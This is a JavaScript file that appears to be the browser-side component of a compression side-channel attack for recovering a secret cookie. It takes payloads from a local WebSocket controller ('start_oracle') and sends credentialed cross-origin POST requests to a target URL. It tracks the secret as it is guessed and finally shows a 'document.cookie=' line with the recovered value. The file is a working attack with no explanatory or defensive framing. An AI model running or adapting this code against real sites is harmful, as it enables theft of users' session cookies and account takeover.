document.documentElement.setAttribute('data-theme', 'code')

const STREAM_URL = 'ws://localhost:9999/xhr-interface'
let guessed = false
let currentFinalSecret = ''
let url = ''
let secretPrefix = ''

window.addEventListener('load', () => {
  guessed = false
  const spinner = document.getElementById('spinner')
  const final = document.getElementById('final')
  const spanUrl = document.getElementById('span-url')
  const spanSecretPrefix = document.getElementById('secret-prefix')
  let number = 0
  const timer = setInterval(() => {
    number = (number + 1) % 9

    if (url.length > 0) spanUrl.innerText = url
    spinner.innerText = number.toString()
    spanSecretPrefix.innerText = secretPrefix
    if (guessed) {
      window.clearInterval(timer)
      final.innerText = 'Try document.cookie="' + secretPrefix + '' + currentFinalSecret + '"'
      spinner.innerText = ''
    }
  }, 50)
})
const start = () => {
  const ws = new window.WebSocket(STREAM_URL)
  ws.onopen = function () {
    console.log('connected to ws')
    ws.send('start_oracle')
  }

  // Log errors
  ws.onerror = function (error) {
    console.error('WebSocket Error ' + error)
  }
  // Log messages from the server
  ws.onmessage = function (e) {
    const data = JSON.parse(e.data)
    url = data.url.toString()
    secretPrefix = data.secretPrefix.toString()
    currentFinalSecret = data.finalSecret.toString()
    if (currentFinalSecret.length >= data.secretLength) guessed = true
    document.getElementById('result').innerHTML = currentFinalSecret
    xhr(url, data.payload)
  }
}

function xhr (url, body) {
  const xhr = new window.XMLHttpRequest()
  xhr.open('POST', url)
  xhr.withCredentials = true
  xhr.setRequestHeader('Content-Type', 'text/plain')
  xhr.send(body.toString())
}

start()
